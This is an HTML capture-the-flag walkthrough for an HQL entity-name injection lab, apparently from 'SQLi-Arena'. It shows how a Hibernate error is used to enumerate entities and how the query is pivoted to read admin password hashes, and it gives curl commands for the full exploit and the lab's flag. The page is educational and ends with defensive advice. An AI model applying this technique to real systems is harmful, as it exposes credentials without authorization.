<!-- Introduction -->
<p>
    The Product Catalog uses a user-supplied entity name in the HQL <code>FROM</code> clause.
    By changing the entity name, we can query unauthorized Hibernate entities and access
    sensitive data including admin credentials and flags.
</p>

<h4>Step 1: Normal Product Query</h4>
<p>Query the <code>Product</code> entity normally to understand the baseline behavior.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Query</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Entity: </span>Product<br>
        <span class="prompt">HQL: </span>FROM Product<br>
        <span class="prompt">Result: </span>10 rows returned<br><br>
        | id | name               | price   | category    |<br>
        |----|--------------------|---------|-------------|<br>
        | 1  | Laptop Pro 15      | 1299.99 | Electronics |<br>
        | 2  | Wireless Mouse     | 29.99   | Electronics |<br>
        | 3  | USB-C Hub          | 49.99   | Electronics |<br>
        | 4  | Standing Desk      | 599.99  | Furniture   |<br>
        | 5  | Ergonomic Chair    | 449.99  | Furniture   |<br>
        | 6  | Monitor Arm        | 89.99   | Accessories |<br>
        | 7  | Mechanical Keyboard| 149.99  | Electronics |<br>
        | 8  | Webcam HD          | 79.99   | Electronics |<br>
        | 9  | Desk Lamp          | 34.99   | Accessories |<br>
        | 10 | Cable Management Kit| 19.99  | Accessories |
    </div>
</div>

<h4>Step 2: Trigger Error for Entity Discovery</h4>
<p>
    Enter an invalid entity name to trigger a Hibernate error. The backend error response
    includes a hint revealing all mapped entities.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Entity Enumeration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Entity: </span>InvalidEntity<br>
        <span class="prompt">HQL: </span>FROM InvalidEntity<br>
        <span class="prompt">Error: </span>org.hibernate.query.sqm.UnknownEntityException: Could not resolve root entity 'InvalidEntity'<br>
        <span class="prompt">Hint: </span>Available entities: [<strong>Product, AuditLog, AdminCredential</strong>]
    </div>
</div>
<p>
    The error reveals three mapped entities: <code>Product</code> (the intended one),
    <code>AuditLog</code>, and <code>AdminCredential</code> (the interesting target).
</p>

<h4>Step 3: Access AdminCredential Entity</h4>
<p>Change the entity name to <code>AdminCredential</code> to access admin data.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Entity Pivot</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Entity: </span>AdminCredential<br>
        <span class="prompt">HQL: </span>FROM AdminCredential<br>
        <span class="prompt">Result: </span>3 rows returned<br><br>
        | id | username     | passwordHash                                                  | secretNote                           |<br>
        |----|--------------|---------------------------------------------------------------|--------------------------------------|<br>
        | 1  | admin        | $2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy | Default admin account                |<br>
        | 2  | superadmin   | $2a$10$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW | <strong>FLAG{hq_3nt1ty_n4m3_1nj}</strong> |<br>
        | 3  | backup_admin | $2a$10$Ue8JHRqO7TkHSCGnsGEPRu2P5JEa7TGiMUCnlOF7r8PnoTfWnV3Hi | Backup account - rotate quarterly    |
    </div>
</div>

<h4>Step 4: Explore AuditLog (Bonus)</h4>
<p>Query the <code>AuditLog</code> entity to see admin activity records.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Audit Logs</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Entity: </span>AuditLog<br>
        <span class="prompt">HQL: </span>FROM AuditLog<br>
        <span class="prompt">Result: </span>4 rows returned<br><br>
        | id | action        | timestamp           | userId |<br>
        |----|---------------|---------------------|--------|<br>
        | 1  | LOGIN         | 2026-03-01 08:00:00 | 1      |<br>
        | 2  | VIEW_PRODUCTS | 2026-03-01 08:05:00 | 1      |<br>
        | 3  | UPDATE_PRICE  | 2026-03-01 09:15:00 | 1      |<br>
        | 4  | LOGIN         | 2026-03-02 10:00:00 | 2      |
    </div>
</div>

<h4>Step 5: Submit the Flag</h4>
<p>
    Copy the flag from the <code>superadmin</code> row's <code>secretNote</code> column
    and paste it into the verification form: <code>FLAG{hq_3nt1ty_n4m3_1nj}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Step 1: </span>curl -s "http://target/SQLi-Arena/hql/lab1" -d "entity=InvalidEntity"<br>
        <span class="prompt">// Error reveals: Available entities: [Product, AuditLog, AdminCredential]</span><br><br>
        <span class="prompt">Step 2: </span>curl -s "http://target/SQLi-Arena/hql/lab1" -d "entity=AdminCredential"<br>
        <span class="prompt">// Returns admin credentials with FLAG in secretNote column</span>
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> HQL entity name injection differs from traditional SQL
    injection. Instead of manipulating SQL syntax, the attacker pivots between mapped Hibernate
    entities by controlling the <code>FROM</code> clause. Error messages from Hibernate often
    disclose available entity names (like <code>UnknownEntityException</code>). This attack
    does not require UNION, quotes, or any SQL syntax: just knowing or discovering other
    entity names. Defense: validate entity names against an allowlist and never expose them
    as user parameters.
</div>
